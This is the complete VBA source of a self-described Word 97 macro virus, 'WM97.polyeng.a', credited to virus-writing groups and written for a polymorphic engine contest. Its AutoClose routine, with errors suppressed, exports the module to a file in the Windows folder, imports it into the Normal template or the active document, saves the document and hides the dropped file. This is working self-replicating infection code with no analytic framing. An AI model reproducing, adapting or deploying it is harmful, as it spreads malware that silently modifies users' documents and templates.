   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "polyeng"
   Sub AutoClose()
   ' [WM97.polyeng.a]
   ' by -KD- / Metaphase VX Team & NoMercyVirusTeam
   ' Tech used from Mr.Vic & 29/A special thanks
   ' This Macro Virii was made Undernet #virus's big-e polymorphic engine contest.
   ' It is SR1 compatable useing import/export.
   On Error Resume Next
   Application.VBE.ActiveVBProject.VBComponents("polyeng").Export "c:\windows\poly.dll"
    For Z = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(Z).Name = "polyeng" Then NormInstall = True
    Next Z
    For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(Z).Name = "polyeng" Then ActivInstall = True
    Next Z
   If ActivInstall = True And NormInstall = False Then Set VX = NormalTemplate.VBProject _
   Else If ActivInstall = False And NormInstall = True Then Set VX = ActiveDocument.VBProject
   VX.VBComponents.Import ("c:\windows\poly.dll")
   ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
   SetAttr ("c:\windows\poly.dll"), vbHidden + vbSystem
   End Sub
